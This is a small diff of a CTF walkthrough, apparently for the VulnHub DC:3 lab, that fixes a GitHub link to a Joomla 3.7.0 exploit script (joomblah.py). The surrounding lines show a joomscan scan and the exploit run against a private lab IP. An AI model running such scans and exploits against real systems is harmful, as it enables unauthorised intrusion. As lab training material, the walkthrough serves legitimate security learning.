@@ -12,7 +12,7 @@ joomscan  --url "http://192.168.100.134/"
 
 ## 2.Exploitation
 
-joomla 3.7.0 exploit ---> install https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/DC:3/joomblah.py
+joomla 3.7.0 exploit ---> install https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/DC%3A3/joomblah.py
 
 python joomblah.py http://192.168.100.134
 
